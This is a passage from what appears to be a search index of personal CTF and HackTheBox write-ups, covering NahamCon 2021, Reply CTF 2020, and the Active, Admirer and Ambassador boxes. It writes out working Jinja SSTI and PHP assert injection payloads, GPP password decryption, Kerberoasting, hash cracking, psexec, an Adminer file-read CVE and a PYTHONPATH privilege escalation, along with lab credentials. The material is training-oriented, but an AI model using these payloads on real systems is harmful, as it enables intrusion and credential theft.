'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}&gt;\n</code></pre> <p>Funny. What about this:</p> <pre><code>code:{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n\nuid=1000(uwsgi) gid=0(root) groups=0(root)\n</code></pre> <p>So we have remote code execution. After some digging i found the flag listing all the envars of the machine:</p> <pre><code>code:{{request.application.__globals__.__builtins__.__import__('os').popen('printenv').read()}}\n\nBASE_URL=challenge.nahamcon.com KUBERNETES_SERVICE_PORT=443 KUBERNETES_PORT=tcp://10.116.0.1:443 UWSGI_ORIGINAL_PROC_NAME=uwsgi HOSTNAME=agenttester-691977e06298952e-5c9d4d6f8f-ssqhz SHLVL=1 PYTHON_PIP_VERSION=21.0.1 PORT= HOME=/root GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568 _=/usr/local/bin/uwsgi PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/b60e2320d9e8d02348525bd74e871e466afdf77c/get-pip.py KUBERNETES_PORT_443_TCP_ADDR=10.116.0.1 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP_PROTO=tcp LANG=C.UTF-8 CHALLENGE_FLAG=flag{fb4a87cfa85cf8c5ab2effedb4ea7006} PYTHON_VERSION=3.8.8 ADMIN_BOT_PASSWORD=*)(@skdnaj238374834**__**= KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP=tcp://10.116.0.1:443 CHALLENGE_NAME=AgentTester PWD=/app ADMIN_BOT_USER=admin KUBERNETES_SERVICE_HOST=10.116.0.1 PYTHON_GET_PIP_SHA256=c3b81e5d06371e135fb3156dc7d8fd6270735088428c4a9a5ec1f342e2024565 UWSGI_RELOADS=0\n</code></pre> <p>Flag: <code>flag{fb4a87cfa85cf8c5ab2effedb4ea7006}</code></p>"},{"location":"CTFs/Nahamcon_2021/Asserted/","title":"Asserted","text":""},{"location":"CTFs/Nahamcon_2021/Asserted/#trying-things","title":"Trying things","text":"<p>After a while a noticed that the url was using an argument to change between pages:</p> <pre><code>http://challenge.nahamcon.com:32302/index.php?page=about\n</code></pre> <p>If i try something like:</p> <pre><code>http://challenge.nahamcon.com:32302/index.php?page=../\n</code></pre> <p>The page returns: <code>HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE</code></p>"},{"location":"CTFs/Nahamcon_2021/Asserted/#digging","title":"Digging","text":"<p>I wanted to check the php code of this <code>index.php</code> so i researched a bit and i used this:</p> <pre><code>http://challenge.nahamcon.com:32302/index.php?page=php://filter/convert.base64-encode/resource=index\n</code></pre> <p>To get a base64 encoded <code>index.php</code> file. After decoding we can take a look to this friend:</p> <pre><code>&lt;?php\n\nif (isset($_GET['page'])) {\n  $page = $_GET['page'];\n  $file = $page . \".php\";\n\n  // Saving ourselves from any kind of hackings and all\n  assert(\"strpos('$file', '..') === false\") or die(\"HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE\");\n\n} else {\n  $file = \"home.php\";\n}\n\ninclude($file);\n\n?&gt;\n</code></pre> <p>Looks like that <code>assert</code> function can be abused. Lets try this simple payload:</p> <pre><code>http://challenge.nahamcon.com:30611/index.php?page='. die(\"HALLO\") .'\n</code></pre> <p>The page printed <code>HALLO</code> to the response body so lets try LFI:</p> <p><pre><code>http://challenge.nahamcon.com:30611/index.php?page='. die(file_get_contents(\"/etc/passwd\")) .'\n</code></pre> And the server printed the hole file to us, cool. Lets find and get the flag then:</p> <pre><code>http://challenge.nahamcon.com:30611/index.php?page='. die(file_get_contents(\"/flag.txt\")) .'\n</code></pre> <p>Flag: <code>flag{85a25711fa6e111ed54b86468a45b90c}</code></p>"},{"location":"CTFs/Nahamcon_2021/HomewardBound/","title":"HomewardBound","text":"<p>According to the page we can only access the webpage through the local network. So i tried to add the <code>X-Forwarded-For</code> header to my <code>GET</code> request with the ip address <code>127.0.0.1</code>. Looks like it worked because the page gave me the flag:</p> <pre><code>flag{26080a2216e95746ec3e932002b9baa4}\n</code></pre>"},{"location":"CTFs/Nahamcon_2021/MeetTheTeam/","title":"MeetTheTeam","text":"<p>Looks like the page has actually the version control software public:</p> <pre><code>https://constellations.page/.git/\n</code></pre> <p>Using a script called <code>gitdumper.sh</code> from GitTools i could extract it. Using <code>git show</code> and checking the changes i found the flag:</p> <pre><code>flag{4063962f3a52f923ddb4411c139dd24c}\n</code></pre>"},{"location":"CTFs/Nahamcon_2021/esab64/","title":"esab64","text":"<p>The challenges gives a file called <code>esab64</code> with an encoded message. The first thing i though was trying to decode the message with base64. The thing is that the result was not... something clear. After a while, an idea came to my mind: esab64 looks like base64 but in reverse so... why not trying to reverse the initial message and then decode it with base64. My idea seems to have worked:</p> <pre><code>_}e61e711106bd0db1b78efa894b1125bf{galf\n</code></pre> <p>I just had to reverse that message again to get the flag:</p> <pre><code>flag{fb5211b498afe87b1bd0db601117e16e}_\n</code></pre>"},{"location":"CTFs/Reply_CTF_Challenge%202020/","title":"Reply CTF Challenge 2020","text":"<p>Reply Cyber Security Challenge, a team competition open to both students and professionals, took place on Friday October 9th 2020 at 19:30 CEST and lasted 24 hours.</p> <p> </p>"},{"location":"CTFs/Reply_CTF_Challenge%202020/Hide%26eXec/","title":"Hide &amp; eXec [300]","text":"<p>The zip contains an image and a protected zip file. The image is some kind of bar code that after decoding will give you a code in some programing language: Java, Bash, Python, Javascript, PHP or Brainfuck (Yeah, im serious). This code will print the password for the protected zip after execution and after extract it we will get... another bar code and another protected zip file (Repeat this a lot of times)</p> <p>This is the code we used to get the flag:</p> <pre><code>import glob\nimport re\nimport os\nimport sys\nimport contextlib\nimport execjs\nimport zxing\n\nfrom io import StringIO\nfrom subprocess import Popen, PIPE, run\nfrom brainfuck import brainfuck\n\n\n@contextlib.contextmanager\ndef stdoutIO(stdout=None):\n    old = sys.stdout\n    if stdout is None:\n        stdout = StringIO()\n    sys.stdout = stdout\n    yield stdout\n    sys.stdout = old\n\ndef php(code):\n    # open process\n    process = Popen(['php'], stdout=PIPE, stdin=PIPE, close_fds=True)\n\n    # read output\n    out = process.communicate(code.encode())[0]\n\n    # kill process\n    try:\n        os.kill(process.pid, signal.SIGTERM)\n    except:\n        pass\n\n    # return\n    return out.decode()\n\ndef java(code):\n    # open process\n    process = Popen(['jshell'], stdout=PIPE, stdin=PIPE, close_fds=True)\n\n    # read output\n    out = process.communicate(f'{code}\\n {\"Main.main(new String[0])\"}\\n'.encode())[0]\n\n    # kill process\n    try:\n        os.kill(process.pid, signal.SIGTERM)\n    except:\n        pass\n\n    strings_list = out.decode().split()\n    return strings_list[len(strings_list)-2]\n\ndef bash(code):\n    # open process\n    process = Popen(['bash'], stdout=PIPE, stdin=PIPE, close_fds=True)\n\n    # read output\n    out = process.communicate(code.encode())[0]\n\n    # kill process\n    try:\n        os.kill(process.pid, signal.SIGTERM)\n    except:\n        pass\n\n    return out.decode().strip()\n\n\nchecked_files = []\n\n# Init reader\nreader = zxing.BarCodeReader()\n\n# Get first file basename\nbasename = glob.glob('*.zip')[0].split(\".\")[0]\n\nwhile basename:\n    # Try to decode image\n    dataObject = reader.decode(f'{basename}.png')\n    code = dataObject.raw\n\n    # Execute the code and get the pass\n    print(\"=========EXTRACTED CODE=========\")\n    password = \"\"\n    if(\"&lt;?php\" in code): # PHP\n        print(code)\n\n        password = php(code)\n    elif(\"class\" in code): # Java\n        print(code)\n\n        password = java(code)\n    elif(\"$\" in code): # Bash\n        print(code)\n\n        password = bash(code)\n    elif(\";\" in code): # JS\n        # Try to fix JS code\n        jsCode = code.replace(\"console.log(output);\", \"return output\")\n        print(jsCode)\n\n        password = execjs.exec_(jsCode)\n    elif(\"+++\" in code): # Brainfuck (Are you serious????)\n        print(code)\n\n        with stdoutIO() as s:\n            brainfuck.evaluate(code)\n            password = s.getvalue().strip()\n    else: # Python\n        # Try to fix python code\n        print(code)\n\n        with stdoutIO() as s:\n            exec(code)\n            password = s.getvalue().strip()\n    print(\"================================\")\n\n    # Print zip password and extract files\n    print(f'Password for {basename}: {password}')\n    with open(os.devnull, 'w') as null:\n        run(['7z', 'x', f'{basename}.zip', f'-p{password}'], stdout=null, stderr=null)\n\n    # Add extracted file to checked files\n    checked_files.append(f'{basename}.zip')\n\n    # Select next file\n    basename = None\n    zip_files = glob.glob('*.zip')\n    for zip_file in zip_files:\n        if zip_file not in checked_files:\n            basename = zip_file.split(\".\")[0]\n            break\n</code></pre> <p>The last zip file password is the flag: <code>{FLG:P33k-4-b0o!UF0undM3,Y0urT0olb0xIsGr8!!1}</code></p>"},{"location":"HackTheBox/","title":"HackTheBox","text":"<p>Cybersecurity training site where you can have access to a lot of challenges. Here you can find all the write ups i have written solving some of those challenges.</p> <p> </p>"},{"location":"HackTheBox/Active/","title":"Active","text":""},{"location":"HackTheBox/Active/#nmap","title":"Nmap","text":"<p>According with the Nmap scan, this is an Active Directory box.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate=1000 10.10.10.100\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 13:23 CET\nNmap scan report for 10.10.10.100\nHost is up (0.047s latency).\nNot shown: 65512 closed tcp ports (reset)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5722/tcp  open  msdfsr\n9389/tcp  open  adws\n47001/tcp open  winrm\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49157/tcp open  unknown\n49158/tcp open  unknown\n49165/tcp open  unknown\n49168/tcp open  unknown\n49169/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 39.26 seconds\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 10.10.10.100\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 13:26 CET\nNmap scan report for 10.10.10.100\nHost is up (0.045s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-31 12:26:24Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5722/tcp  open  msrpc         Microsoft Windows RPC\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   210: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2023-01-31T12:27:18\n|_  start_date: 2023-01-30T19:18:42\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 65.24 seconds\n</code></pre> <p>Time to enumerate a bit the domain and see what we can find.</p>"},{"location":"HackTheBox/Active/#active-directory-policies","title":"Active Directory policies","text":"<p>Using enum4linux and smbclient I found that there is a share called: <code>Replication</code> that I can read without credentials. Looking arount it I got the file <code>Groups.xml</code>:</p> <pre><code>smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\&gt; ls\n  .                                   D        0  Sat Jul 21 12:37:44 2018\n  ..                                  D        0  Sat Jul 21 12:37:44 2018\n  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018\n\n        5217023 blocks of size 4096. 277179 blocks available\n</code></pre> <p>This file contains a group policy that basically creates a user with the name <code>SVC_TGS</code>. The password is there too in an encoded format.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;\n&lt;/Groups&gt;\n</code></pre> <p>The password can be easily recovered using <code>gpp-decrypt</code>, so now we have valid credentials for what looks like a valid account in the domain.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Active]\n\u2514\u2500$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\nGPPstillStandingStrong2k18\n</code></pre> <p>The only problem is that we cannot really get access to the machine yet. Powershell remoting is not enabled and the user is not administrator so Psexec trick won't work neither. </p> <p>For now, we could get the user flag through the <code>Users</code> share but not much more...</p>"},{"location":"HackTheBox/Active/#pwned","title":"Pwned!","text":"<p>Well, looks like we can actually do something. I decided to see if Kerberoasting was an option and looks like the SMB service is running using a normal user account.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ crackmapexec ldap active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting KERBEROASTING\nSMB         active.htb      445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)\nLDAP        active.htb      389    DC               [+] active.htb\\SVC_TGS:GPPstillStandingStrong2k18 \nLDAP        active.htb      389    DC               [*] Total of records returned 4\nCRITICAL:impacket:CCache file is not found. Skipping...\nLDAP        active.htb      389    DC               sAMAccountName: Administrator memberOf: CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb pwdLastSet: 2018-07-18 21:06:40.351723 lastLogon:2023-01-30 20:19:43.216140\nLDAP        active.htb      389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$229e62ef990e89d48a31c5742e534fc9$24f56e360c22ce0039da8df720555ba45f225944abd08ce3d6734df1c238d2a1254464592c74d961bec86a09ec798c7cb26f4237c337be668f8d8629ab9114cdb0e58431d233692d242335b8a0be9ffb8d2222ae164e3536d1681f27e181a116133b8956e0467a62aca3f282a4fe742ec0478002a89766df0f976be6b7a42c832ed9ed1e587bb93e4f3c800ce9cc706010d18d6395c640a27547e050de0363fc7c333c5a60a12422f56539d1d6ba200f8d889dc43927787fad2017ea0473daa84ec1bb0bce87fd28ae010dc96cde6b9f12a5a887f28091b0822aea9a90c78b4c6c73092b7b41f4008d043c5860b82cd478f07407577f214403414388e87dadf15ed365282b4421114c7e0a4ea0388d0c8cab6805ec83d33d55b10b258d206eea9b9161a6547ed63462d0568ca4343677dfdf2916a0999f4d449514a41a9a4ad6f9cb2c266eff43953403cd968725968d0734222fe9e9780d986863ae9958fc0d72892172c4c529410db6cb4d14b6637a76fabb79486b806770cbf2ce370b4cdc3cf91e0ea2a75a825d2e83dd6a212e282cb4e33667e36f1149bc8dc6c40654bdace02da06f4e0c3ffc80531a09538d8e22d2745ee20616918cf5cf61dc80c2f8b6970fa2119e8efae9d10fe2b2af3fb0a3124beef8fa51c6f24ae5de8f2cf030e7322bb9aae5a1fbf146c6affe30783011c7bdf5737b45fab69c99459dcade8b1e503a87973404c816cdf5768940a06a3897e8849674bfe8cb360219e79ada9b680a67c23e2bb3175a7f626c96c369a3170b6f98f2e48a65c3976c9819825701447f956668b3a3540acc89c43aa7888e43b8429cb8fb6e1a1916e990c5294d4864bfe33e9fc08e5bf24e83cec45767821de59d903b900522de4d9ac6669cd75860ba52caea7dfe0cf747e35c04d461ebf98090a7f21439d1f68f2c52b23adaa0d647d48a90211ef3cacdc6dec1ba08762b3db5c3aecbf3d6164af2daa49b1e434c7a908b1e0aaa251d9a90cafb595226e91ac673cec3d76b615765849b7966fe7f04fdebc8c7939955ed317c72baa5432c0e8ac58f627e7f944e816ea5bf2e64d89c2a8c5b3ead9d064c11b9a6aa563043d32bad037ca2f962e241cadc2c80caa4621892c8c62224dc4f8ff65199af37ae50467ee36e73b3bcf6608cbfc6c4bb6ff673bc76f7bb3e03d280f8db9b7adcf2cb9b5deb599bd9401cee79e0101329db320138c14598b89a6ddf2c1683c94199dc92a0000706d14897\n</code></pre> <p>Once with the TGS collected, I tried to crack it using the Rockyou dictionary. After a bit the service password was found.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Active]\n\u2514\u2500$ john --wordlist=~/Wordlists/rockyou.txt hashes                                                    \nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nTicketmaster1968 (?)     \n1g 0:00:00:03 DONE (2023-01-31 14:23) 0.3021g/s 3183Kp/s 3183Kc/s 3183KC/s Tiffani1432..Thehunter22\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>Since now we hace an account with administrator privileges, we can use Psexec and get access to the machine!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Requesting shares on active.htb.....\n[*] Found writable share ADMIN$\n[*] Uploading file oHEvJISy.exe\n[*] Opening SVCManager on active.htb.....\n[*] Creating service MEaL on active.htb.....\n[*] Starting service MEaL.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n\nC:\\Windows\\system32&gt;\n</code></pre>"},{"location":"HackTheBox/Admirer/","title":"Admirer","text":""},{"location":"HackTheBox/Admirer/#nmap","title":"Nmap","text":"<p>You guessed it, Nmap time!</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p- --min-rate=1000 10.10.10.187  \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 20:22 CET\nNmap scan report for 10.10.10.187\nHost is up (0.039s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 42.76 seconds\n\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p 21,22,80 -sC -sV 10.10.10.187\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-26 20:26 CET\nNmap scan report for 10.10.10.187\nHost is up (0.038s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)\n| ssh-hostkey: \n|   2048 4a71e92163699dcbdd84021a2397e1b9 (RSA)\n|   256 c595b6214d46a425557a873e19a8e702 (ECDSA)\n|_  256 d02dddd05c42f87b315abe57c4a9a756 (ED25519)\n80/tcp open  http    Apache httpd 2.4.25 ((Debian))\n| http-robots.txt: 1 disallowed entry \n|_/admin-dir\n|_http-server-header: Apache/2.4.25 (Debian)\n|_http-title: Admirer\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.83 seconds\n</code></pre> <p>Since I cannot really connect to the FTP server I will start with the port 80.</p>"},{"location":"HackTheBox/Admirer/#port-80","title":"Port 80","text":"<p>The first thing I noticed from the Nmap scan was the <code>robots.txt</code> file: <pre><code>User-agent: *\n\n# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo\nDisallow: /admin-dir\n</code></pre></p> <p>I guess <code>waldo</code> could be a valid SSH user, Time for a directory bruteforce since the directory listing is disabled, I found these files:</p> <pre><code># contacts.txt\n\n##########\n# admins #\n##########\n# Penny\nEmail: p.wise@admirer.htb\n\n\n##############\n# developers #\n##############\n# Rajesh\nEmail: r.nayyar@admirer.htb\n\n# Amy\nEmail: a.bialik@admirer.htb\n\n# Leonard\nEmail: l.galecki@admirer.htb\n\n\n\n#############\n# designers #\n#############\n# Howard\nEmail: h.helberg@admirer.htb\n\n# Bernadette\nEmail: b.rauch@admirer.htb\n</code></pre> <pre><code># credentials.txt\n\n[Internal mail account]\nw.cooper@admirer.htb\nfgJr6q#S\\W:$P\n\n[FTP account]\nftpuser\n%n?4Wz}R$tTF7\n\n[Wordpress account]\nadmin\nw0rdpr3ss01!\n</code></pre> <p>The FTP credentials are valid so let's take a look.</p>"},{"location":"HackTheBox/Admirer/#ftp","title":"FTP","text":"<p>I was able to get a backup of the site (or maybe an internal one). I found another \"secret\" directory with a new credential:</p> <pre><code># w4ld0s_s3cr3t_d1r/credentials.txt\n\n[Bank Account]\nwaldo.11\nEzy]m27}OREc$\n</code></pre> <p>Also found some credentials for databases:</p> <pre><code># index.php\n\n$servername = \"localhost\";\n$username = \"waldo\";\n$password = \"]F7jLHw:*G&gt;UPrTo}~A\"d6b\";\n$dbname = \"admirerdb\";\n</code></pre> <pre><code># utility-scripts/db_admin.php\n\n$servername = \"localhost\";\n$username = \"waldo\";\n$password = \"Wh3r3_1s_w4ld0?\";\n</code></pre> <p>I tried some of the passwords and users in SSH but no luck. The thing is that the file <code>utility-scripts/admin_task.php</code> exists in the live website and it is executing a script using <code>shell_exec</code>. Since it is not cleaning the input I believe I can get code execution by just changing a bit the form values.</p> <pre><code> if(isset($_REQUEST['task']))\n  {\n    $task = $_REQUEST['task'];\n    if($task == '1' || $task == '2' || $task == '3' || $task == '4' ||\n       $task == '5' || $task == '6' || $task == '7')\n    {\n      /*********************************************************************************** \n         Available options:\n           1) View system uptime\n           2) View logged in users\n           3) View crontab (current user only)\n           4) Backup passwd file (not working)\n           5) Backup shadow file (not working)\n           6) Backup web data (not working)\n           7) Backup database (not working)\n\n           NOTE: Options 4-7 are currently NOT working because they need root privileges.\n                 I'm leaving them in the valid tasks in case I figure out a way\n                 to securely run code as root from a PHP page.\n      ************************************************************************************/\n      echo str_replace(\"\\n\", \"&lt;br /&gt;\", shell_exec(\"/opt/scripts/admin_tasks.sh $task 2&gt;&amp;1\"));\n    }\n    else\n    {\n      echo(\"Invalid task.\");\n    }\n  } \n  ?&gt;\n</code></pre> <p>After a bit I was not able to execute a thing... I found <code>utility-scripts/adminer.php</code> though, I guess we can try to connect to the databases now.</p>"},{"location":"HackTheBox/Admirer/#adminer","title":"Adminer","text":"<p>Well nope, we cant get access to the databases. At least the Adminer version: 4.6.2 is vulnerable to CVE-2021-43008. Basically you can get access to files of the server connecting the Adminer panel to a SQL server you control.</p> <p>Let's prepare the environment, using Docker I started a server in my machine:</p> <pre><code>version: '3.3'\nservices:\n  db:\n    image: mysql:5.7\n    environment:\n      MYSQL_DATABASE: 'lfr_sink_db'\n      # So you don't have to use root, but you can if you like\n      MYSQL_USER: 'user'\n      # You can use whatever password you like\n      MYSQL_PASSWORD: 'password'\n      # Password for root access\n      MYSQL_ROOT_PASSWORD: 'password'\n    ports:\n      # &lt;Port exposed&gt; : &lt; MySQL Port running inside container&gt;\n      - '3306:3306'\n    expose:\n      # Opens port 3306 on the container\n      - '3306'\n</code></pre> <p>I had to connect to it through Adminer and create a new table called <code>lfr_sink_table</code> to make sure the tool I want to use (More on it later) works properly:</p> <pre><code>CREATE TABLE IF NOT EXISTS lfr_sink_table (a varchar(255));\n</code></pre> <p>I found this tool to ease the exploitation. I noticed that I was not able to access all files I want BUT I can retrieve files from the webserver itself:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Admirer/CVE-2021-43008-AdminerRead]\n\u2514\u2500$ python3 AdminerRead.py -t http://10.10.10.187/utility-scripts/adminer.php -I 10.10.14.55 -P 3306 -u root -p password -f /var/www/html/index.php\n     _       _           _                 ____                _\n    / \\   __| |_ __ ___ (_)_ __   ___ _ __|  _ \\ ___  __ _  __| |\n   / _ \\ / _` | '_ ` _ \\| | '_ \\ / _ \\ '__| |_) / _ \\/ _` |/ _` |\n  / ___ \\ (_| | | | | | | | | | |  __/ |  |  _ &lt;  __/ (_| | (_| |\n /_/   \\_\\__,_|_| |_| |_|_|_| |_|\\___|_|  |_| \\_\\___|\\__,_|\\__,_|   v1.1.0\n\n[&gt;] Remote Adminer version : v4.6.2\n\n[+] (  4.52 kB) /var/www/html/index.php\n</code></pre> <p>Inside that file, I found again credentials for a database but the password is different. I tried it in SSH and we are in!</p> <pre><code>$servername = \"localhost\";\n$username = \"waldo\";\n$password = \"&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;\";\n$dbname = \"admirerdb\";\n</code></pre>"},{"location":"HackTheBox/Admirer/#pwned","title":"Pwned!","text":"<p>Check this, maybe we can abuse this <code>sudo</code> configuration.</p> <pre><code>waldo@admirer:~$ sudo -l\n[sudo] password for waldo: \nMatching Defaults entries for waldo on admirer:\n    env_reset, env_file=/etc/sudoenv, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=always\n\nUser waldo may run the following commands on admirer:\n    (ALL) SETENV: /opt/scripts/admin_tasks.sh\n</code></pre> <p>Can't abuse path injection in the script but I noticed it is calling a python script in one of the options:</p> <pre><code>backup_web() --&gt; /opt/scripts/backup.py\n</code></pre> <p>Checking the Python script I can try to inject a custom <code>make_archive</code> funtion modifying <code>PYTHONPATH</code> variable.</p> <pre><code>#!/usr/bin/python3\n\nfrom shutil import make_archive\n\nsrc = '/var/www/html/'\n\n# old ftp directory, not used anymore\n#dst = '/srv/ftp/html'\n\ndst = '/var/backups/html'\n\nmake_archive(dst, 'gztar', src)\n</code></pre> <p>I created this little Python script, the idea is that the website backup task will run this code instead of the intended one and make the <code>/bin/bash</code> binary a SUID binary.</p> <pre><code>waldo@admirer:~$ cat shutil.py \nimport os\n\ndef make_archive(param1, param2, param3):\n    os.system('chmod u+s /bin/bash')\n</code></pre> <p>Now we can execute the web backup task and we are <code>root</code>!</p> <pre><code>waldo@admirer:~$ sudo PYTHONPATH=/home/waldo/ /opt/scripts/admin_tasks.sh\n\n[[[ System Administration Menu ]]]\n1) View system uptime\n2) View logged in users\n3) View crontab\n4) Backup passwd file\n5) Backup shadow file\n6) Backup web data\n7) Backup DB\n8) Quit\nChoose an option: 6\nRunning backup script in the background, it might take a while...\nwaldo@admirer:~$ bash -p\nbash-4.4#\n</code></pre>"},{"location":"HackTheBox/Ambassador/","title":"Ambassador","text":""},{"location":"HackTheBox/Ambassador/#nmap","title":"Nmap","text":"<p>Let's start with a Nmap scan as always to see what we can do here:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1500 -p- 10.10.11.183\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 13:31 EST\nNmap scan report for 10.10.11.183\nHost is up (0.053s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3000/tcp open  ppp\n3306/tcp open  mysql\n\nNmap done: 1 IP address (1 host up) scanned in 26.65 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Ambassador]\n\u2514\u2500$ sudo nmap -sC -sV -p22,80,3000,3306 10.10.11.183                                                           130 \u2a2f\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-11-16 13:41 EST\nNmap scan report for 10.10.11.183\nHost is up (0.049s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)\n|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)\n|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-generator: Hugo 0.94.2\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Ambassador Development 